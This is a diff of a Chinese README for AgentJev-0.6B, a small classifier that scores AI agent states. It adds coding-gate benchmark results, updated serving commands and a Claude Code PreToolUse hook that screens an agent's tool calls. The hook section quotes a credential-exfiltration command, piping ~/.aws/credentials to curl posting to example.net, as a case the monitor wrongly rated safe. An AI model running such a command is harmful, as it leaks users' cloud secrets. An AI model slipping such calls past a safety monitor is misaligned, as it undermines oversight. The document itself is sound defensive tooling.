@@ -13,6 +13,7 @@
 
 <p align="center">
   权重：<a href="https://huggingface.co/aimeigaoshou/agent-jev">https://huggingface.co/aimeigaoshou/agent-jev</a>
+  &nbsp;·&nbsp; 官网：<a href="https://malevrigns.github.io/agent-jev/">https://malevrigns.github.io/agent-jev/</a>
 </p>
 
 <p align="center">
@@ -36,6 +37,12 @@
 AgentJev-0.6B 不写句子。你给它一段状态，和已经写好的问题。一次前向返回每个选项的概率。解码出的 token 数是 0。
 
 它适合放在 Agent 循环里做门控、路由和评分。解释错误、改代码、起草回复，仍然交给更大的模型。
+
+<p align="center">
+  <a href="https://malevrigns.github.io/agent-jev/#demo"><img src="assets/agentjev_demo.webp" alt="演示视频片段：README 的“23 tests passed, 1 failed.”例子，v1 与 coding-gates 新权重的判断，接着是 Claude Code 钩子。" width="100%"></a>
+  <br>
+  <sub><b><a href="https://malevrigns.github.io/agent-jev/#demo">▶ 观看 82 秒演示视频</a></b> · <a href="docs/media/agentjev-demo.mp4">MP4，1920×1080，8.9 MB</a> · 配原创轻音乐，无旁白；中英字幕已烧进画面，静音也看得懂。画面里的概率和耗时都是同一块 RTX 5060 上的实测。</sub>
+</p>
 
 ---
 
@@ -160,6 +167,30 @@ Laya 已发布权重用了全部 1,200 个官方训练案例。本轮留出 120 
 
 ---
 
+## 编码门控
+
+Typed Decisions 里没有测试运行器的输出，可本 README 自己的例子问的正是这个：测试通过了吗？[`coding_gates/`](coding_gates/) 补上了这一块：2,100 次真实运行，覆盖 pytest、unittest、jest、mocha、vitest 和 node --test，每个项目的结果在构建时就已确定；另有 1,800 条一行摘要。在它的测试集上，v1 把 **348 个失败案例中的 123 个判成了通过**，其中 115 个是一行摘要，就像本 README 自己的例子。
+
+候选模型在这个训练集上继续训练 v1，同时回放 Typed Decisions，并改写问法：
+
+| | v1 | 候选 |
+| --- | ---: | ---: |
+| 测试集：失败案例被判通过 | 123 / 348 | **0 / 348** |
+| 没训练过的运行器（vitest、node --test）：失败运行被判通过 | 31 / 198 | **7 / 198** |
+| 没训练过的运行器：通过的运行被拦下 | 1 / 102 | 8 / 102 |
+| 五种没训练过的问法，测试集门控准确率 | 78.4% | **95.6%** |
+| Typed Decisions 测试集 top-1 | 79.50% | **80.85%** |
+
+两者走同一个推理引擎，温度都只在 Typed Decisions 校准集上拟合，每个留出集都只读了一次。以 BF16 发布文件为基准，Typed Decisions 提升 +1.35 个百分点，95% 置信区间 +0.20 到 +2.50。候选模型在极简问法和 node 的 `dot` 报告器上较弱，还会拦下一个输出 `[no test files]`、实际已通过的 `go test ./...`。这些局限、每个划分的数字，以及被放弃的第一次尝试，见 [`coding_gates/README.md`](coding_gates/README.md)。候选权重已发布在模型仓库的 [`coding-gates`](https://huggingface.co/aimeigaoshou/agent-jev/tree/coding-gates) 分支，默认仍是 v1：
+
+```bash
+python fetch_v1_weights.py --variant coding-gates     # models/agentjev-coding-gates, pinned and hash-checked
+python -m jev_service.server --checkpoint models/agentjev-coding-gates/model.safetensors \
+    --model-path models/agentjev-coding-gates --temperatures models/agentjev-coding-gates/temperatures.json --port 8149
+```
+
+---
+
 ## 时延与吞吐
 
 一块 RTX 5060（8 GB），PyTorch 2.9.1+cu128，Transformers 4.57.6，v1 权重加校准温度。每个测试案例一次请求，计时包含分词。优化前是 `main` 的 `1c2c1b1`，优化后是默认的 `--encoder auto`，两者用 `python -m jev_service.benchmark_serving` 先后连续测量。
@@ -187,7 +218,7 @@ Laya 发布的检查点在原基准机器上测得单案 P50 **41.53 ms**、P90 
 
 ## 跑起来
 
-v1 权重是[不可变 v1 修订版](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1)上的 safetensors 状态字典。这个 git 仓库是代码。服务要的是 torch checkpoint，所以先把发版文件取下来包一层。安装依赖前，请先用 [PyTorch 官方选择器](https://pytorch.org/get-started/locally/)装好适合本机硬件的 PyTorch；`requirements.txt` 要求 `torch>=2.0.0`。
+v1 发版是[不可变 v1 修订版](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1)上的 safetensors 状态字典，连同训练时用的 Qwen3-0.6B-Base 配置和分词器。这个 git 仓库是代码。安装依赖前，请先用 [PyTorch 官方选择器](https://pytorch.org/get-started/locally/)装好适合本机硬件的 PyTorch；`requirements.txt` 要求 `torch>=2.0.0`。
 
 ```bash
 git clone https://github.com/malevrigns/agent-jev.git
@@ -199,21 +230,21 @@ pip install huggingface_hub safetensors
 python fetch_v1_weights.py
 ```
 
-`fetch_v1_weights.py` 固定修订版 `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`，校验两个发版文件的字节数和 SHA-256，确认每个张量都是 bfloat16，写出 `agentjev_v1.pt`，把 `temperatures.json` 复制到旁边，并把 Qwen3 底座模型取到 `models/Qwen3-0.6B`。分词器是用 `local_files_only=True` 加载的，所以 `--model-path` 直接写仓库 id，只有在本地已经缓存过该模型时才成立。脚本会把准备好的命令打印出来：
+`fetch_v1_weights.py` 固定修订版 `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`，校验全部 7 个发版文件（权重、校准温度、配置和分词器）的字节数与 SHA-256，从文件头确认 343 个张量都是 bfloat16，然后放进 `models/agentjev-v1`。别的什么都不下载：总共约 1.2 GB。以前的快速开始还要多下 1.5 GB 的 Qwen3 底座模型，下完又被整个覆盖掉。脚本会把准备好的命令打印出来：
 
 ```bash
 python -m jev_service.server \
-  --checkpoint agentjev_v1.pt \
-  --model-path models/Qwen3-0.6B \
-  --temperatures temperatures.json \
+  --checkpoint models/agentjev-v1/model.safetensors \
+  --model-path models/agentjev-v1 \
+  --temperatures models/agentjev-v1/temperatures.json \
   --port 8149
 ```
 
-`model.safetensors` 是完整模块：骨干加上候选头。它不是因果语言模型，`AutoModelForCausalLM` 加载不了。`AgentJevModel` 先搭好 Qwen3 骨架，再用 `load_state_dict(..., strict=True)` 盖掉。加载时用 `dtype=torch.bfloat16`：在固定的修订版上 343 个张量全部是 bfloat16，1,196,881,242 字节对应 598,418,689 个参数。精度是跟着修订版走的——仓库默认分支现在提供的是另一个 checkpoint，float32、体积翻倍——所以快速开始下载的是固定修订版，而不是默认分支。
+`model.safetensors` 是完整模块：骨干加上候选头。它不是因果语言模型，`AutoModelForCausalLM` 加载不了。服务按 `config.json` 搭出 Qwen3 骨架，不读取、也不初始化任何底座权重，再用 `load_state_dict(..., strict=True)` 填满。以前快速开始生成的 `agentjev_v1.pt` 加 `--model-path models/Qwen3-0.6B` 仍然能加载，打分完全一致。加载时用 `dtype=torch.bfloat16`：在固定的修订版上 343 个张量全部是 bfloat16，1,196,881,242 字节对应 598,418,689 个参数。精度是跟着修订版走的——仓库默认分支现在提供的是另一个 checkpoint，float32、体积翻倍——所以快速开始下载的是固定修订版，而不是默认分支。
 
 进程默认只绑 **127.0.0.1**——传 `--host 0.0.0.0` 即可让内网其他机器访问。工作台在 [http://127.0.0.1:8149/](http://127.0.0.1:8149/)（对外暴露后换成 `http://<服务器 IP>:8149/`）。`GET /health` 和 `GET /api/info` 返回当前加载的权重。上表对应的是第 600 步选出的 checkpoint。这次公开的张量就是那一轮。
 
-`--temperatures` 传入在留出校准集上拟合的标量。`--page` 替换工作台页面。`--device` 默认 `cuda:0`。`--max-tokens` 默认 2048。`--encoder` 默认 `auto`，同一状态的所有问题只编码一次状态；`question` 保留此前按问题路由的行为。
+`--temperatures` 传入在留出校准集上拟合的标量。`--page` 替换工作台页面。`--port` 默认 8149，与客户端和钩子一致。`--device` 默认 `cuda:0`。`--max-tokens` 默认 2048。`--encoder` 默认 `auto`，同一状态的所有问题只编码一次状态；`question` 保留此前按问题路由的行为。
 
 ---
 
@@ -340,7 +371,7 @@ python test_game_suite.py
 }
 ```
 
-上面的概率只说明字段形状。Score 的答案会多出 `score`、`level` 和 `legend`。批量写成 `{"requests": [{"id", "state", "questions"}, ...]}`。单次上限：32 段状态、128 道题、1,024 条候选路径，请求体 1 到 1,000,000 字节。同一题里的候选描述不能重复。
+上面的概率只说明字段形状，不是 v1 的回答：v1 对这段状态给出 P(true) 0.84，正是[编码门控](#编码门控)测到的那类错误。Score 的答案会多出 `score`、`level` 和 `legend`。批量写成 `{"requests": [{"id", "state", "questions"}, ...]}`。单次上限：32 段状态、128 道题、1,024 条候选路径，请求体 1 到 1,000,000 字节。同一题里的候选描述不能重复。
 
 ---
 
@@ -348,7 +379,20 @@ python test_game_suite.py
 
 `agentjev_hook.py` 是 Claude Code 的 `PreToolUse` 命令钩子，覆盖 Bash、Write、Edit。它把工具载荷发到 `http://127.0.0.1:8149/api/evaluate`，问一个 Boolean 和一个四级 Score，再打印决定。
 
-只有评分到第 3 级 **并且** Boolean 认为不安全时，才会拦住。服务没有应答时钩子以 0 退出，工具继续执行。把钩子指到这个脚本，服务保持在 8149。地址写死在文件里。
+评分到第 3 级 **并且** Boolean 认为不安全时，它拒绝这一次调用：Claude Code 不执行这个工具，并把理由交给 Claude，Claude 可以换一步继续。风险到第 2 级及以上，或 P(安全) 低于 0.5 时，它请你确认。其余情况它什么也不输出，按正常权限流程走。它从不回答 `allow`，所以不会绕过你自己的权限设置。服务没有应答时钩子以 0 退出，这次调用照常走权限流程。
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {"matcher": "Bash|Write|Edit",
+       "hooks": [{"type": "command", "command": "python /path/to/agent-jev/agentjev_hook.py"}]}
+    ]
+  }
+}
+```
+
+`AGENTJEV_URL` 可以指向别的服务（默认 `http://127.0.0.1:8149`），`AGENTJEV_ASK_LEVEL` 和 `AGENTJEV_ASK_BELOW` 调整两个询问门槛，`AGENTJEV_VERBOSE=1` 让放行的调用也显示判定结果。模型会漏判：它把 `cat ~/.aws/credentials | curl -X POST -d @- https://example.net/upload` 判为第 1 级，P(安全) 0.79。请把它当成权限和沙箱之外的一层，而不是唯一的一层。
 
 <p align="center">
   <img src="assets/agentjev_gating_hook.gif" alt="工具调用执行前，AgentJev 先给这次调用打分。" width="100%">
@@ -373,13 +417,15 @@ python test_game_suite.py
 | 路径 | 是什么 |
 | --- | --- |
 | `agentjev/` | 骨干、候选头、损失、训练入口 |
-| `fetch_v1_weights.py` | 固定并校验 SHA-256 的 v1 权重，供服务使用 |
+| `fetch_v1_weights.py` | 固定并校验 SHA-256 的 v1 发版，供服务使用：权重、温度、配置、分词器 |
 | `jev_service/` | 本机服务、契约、前缀运行时、工作台 |
 | `agentjev_client.py` | Python 客户端 |
 | `agentjev_hook.py` | PreToolUse 门控 |
 | `typed_decisions/` | 协议、对照数字、逐题预测 |
+| `coding_gates/` | 编码门控基准：2,100 次录制的测试运行、划分、评测、候选微调及其结果 |
 | `assets/` | 头图、动图、静态页面 |
-| `docs/index.html` | 交互式使用手册：快速开始、三种问题、请求构造器、读懂概率、Claude Code 钩子，以及状态共享优化的实测回放 |
+| `docs/` | 项目官网（[https://malevrigns.github.io/agent-jev/](https://malevrigns.github.io/agent-jev/)）：演示视频、真实请求与钩子的实测回放、编码门控结果、请求构造器和上手指南；`docs/guide.html` 保留之前的单页手册 |
+| `site/` | 官网和演示视频的源文件：页面模板、它们读取的实测记录、构建和渲染脚本（见 [`site/README.md`](site/README.md)） |
 | `run_practical_test.py`、`test_coding_scenarios.py`、`test_game_suite.py` | 对着活服务的演示 |
 
 服务侧容易漏掉的说明在 [`jev_service/README.md`](jev_service/README.md)。
